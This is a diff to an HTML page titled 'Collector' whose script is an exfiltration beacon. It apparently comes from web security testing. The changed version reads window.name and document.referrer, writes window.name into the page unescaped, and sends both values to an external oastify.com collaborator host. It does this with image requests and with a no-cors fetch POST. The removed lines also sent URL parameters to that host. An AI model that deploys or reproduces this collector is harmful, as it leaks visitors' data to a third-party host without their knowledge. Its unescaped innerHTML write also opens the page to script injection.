@@ -3,20 +3,33 @@
 <head><title>Collector</title></head>
 <body>
 <h1>Data Collector</h1>
+<div id="data"></div>
+
 <script>
 const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';
 
-// Check referrer
-new Image().src = EXFIL + '/?referrer=' + encodeURIComponent(document.referrer);
+// 1. Capture window.name
+const windowName = window.name;
+document.getElementById('data').innerHTML = 'Window name: ' + windowName;
 
-// Check window.name
-new Image().src = EXFIL + '/?name=' + encodeURIComponent(window.name);
+new Image().src = EXFIL + '/?name=' + encodeURIComponent(windowName);
 
-// Check if we have any data in URL
-const params = new URLSearchParams(window.location.search);
-for (let [k, v] of params) {
-    new Image().src = EXFIL + '/?param_' + k + '=' + encodeURIComponent(v);
-}
+// 2. Capture referrer (last page visited)
+const ref = document.referrer;
+new Image().src = EXFIL + '/?referrer=' + encodeURIComponent(ref);
+
+// 3. Send combined data
+fetch(EXFIL + '/collected', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify({
+        name: windowName,
+        referrer: ref,
+        timestamp: new Date().toISOString()
+    })
+});
+
+document.getElementById('data').innerHTML += '<br>Referrer: ' + ref;
 </script>
 </body>
 </html>
